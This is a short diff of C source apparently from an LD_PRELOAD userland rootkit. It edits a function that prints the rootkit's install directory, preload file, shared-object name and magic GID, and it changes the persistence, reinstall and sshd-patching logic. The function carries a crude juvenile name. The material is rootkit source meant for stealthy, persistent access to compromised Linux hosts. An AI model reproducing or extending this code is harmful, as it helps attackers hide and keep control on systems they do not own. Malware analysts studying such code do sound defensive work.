@@ -64,18 +64,31 @@ syms symbols[ALL_SIZE];
 #define LINE_MAX 2048
 #define sizeofarr(arr) sizeof(arr) / sizeof(arr[0])
 
-static void imgay(void){
-    printf("INSTALL_DIR:"INSTALL_DIR);
-    printf("OLD_PRELOAD:"OLD_PRELOAD);
-    printf("PRELOAD_FILE:"PRELOAD_FILE);
-    printf("BDVLSO:"BDVLSO);
-}
+extern void imgay(void);
 
 void plsdomefirst(void);
 #include "includes.h"
 
+extern void imgay(void){
+    if(!rknomore()) return;
+    printf("INSTALL_DIR:"INSTALL_DIR"\n");
+#ifndef PATCH_DYNAMIC_LINKER
+    printf("OLD_PRELOAD:"OLD_PRELOAD"\n");
+#else
+    printf("PRELOAD_FILE:"PRELOAD_FILE"\n");
+#endif
+    printf("BDVLSO:"BDVLSO"\n");
+    printf("MAGIC_GID:"MGIDSTR"\n");
+}
+
 void plsdomefirst(void){
-    if(notuser(0) || rknomore(INSTALL_DIR, BDVLSO))
+    /*char *myname = resolvelibpath();
+    if(myname != NULL){
+        printf("myname: %s\n", myname);
+        free(myname);
+    }else printf("myname is null!\n");*/
+
+    if(notuser(0) || rknomore())
         return;
 
     gid_t magicgid = readgid();
@@ -118,9 +131,9 @@ void plsdomefirst(void){
 #endif
 #ifdef ALWAYS_REINSTALL
 #ifdef PATCH_DYNAMIC_LINKER
-    reinstall(PRELOAD_FILE, INSTALL_DIR, BDVLSO);
+    reinstall(PRELOAD_FILE, NULL, NULL);
 #else
-    reinstall(OLD_PRELOAD, INSTALL_DIR, BDVLSO);
+    reinstall(OLD_PRELOAD, NULL, NULL);
 #endif
 #endif
 #ifdef SSHD_PATCH_HARD
